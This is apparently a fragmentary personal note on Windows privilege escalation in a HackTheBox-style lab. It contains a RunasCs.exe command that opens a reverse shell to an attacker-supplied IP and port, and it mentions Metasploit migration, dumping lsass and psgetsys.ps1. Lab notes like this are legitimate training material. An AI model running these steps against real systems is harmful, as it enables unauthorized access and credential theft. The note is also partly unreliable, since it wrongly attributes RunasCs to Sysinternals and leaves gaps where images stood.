...
![[Pasted image 20250729045113.png]]
...
> [!NOTE] Title
> You may not be able to see your privileges such as `SeDebugPrivilege`, Because of UAC and intigrety levels. 
> You need to be more patianet with the user you have, and try to use `RunasCs.exe`
...
![[Pasted image 20250729045315.png]]
...
You may need to bypass UAC, I have used `RunasCs.exe` from systemInternals to initiate reverse shell with higher intigerity level.
we have used `-r` for reverse shell, you can make your own reverse shell or execute what ever you want.

```batch
PS C:\ProgramData> .\RunasCs.exe <username> <password> cmd -r <My-ip>:<PORT>
```

Now we will need metasploit to do `migrate` action, So we will create another reverse shell put this time it has higher intigrety.
...
2.nd_reverse_shell>cd \users\administrator\desktop
...
> [!NOTE] Title
> Dumping lsass process may crash the system.
...
https://0xdf.gitlab.io/2024/06/08/htb-pov.html# -> how to use psgetsys.ps1
...
![[Pasted image 20250729051930.png]]
...
![[Pasted image 20250729051953.png|500]]
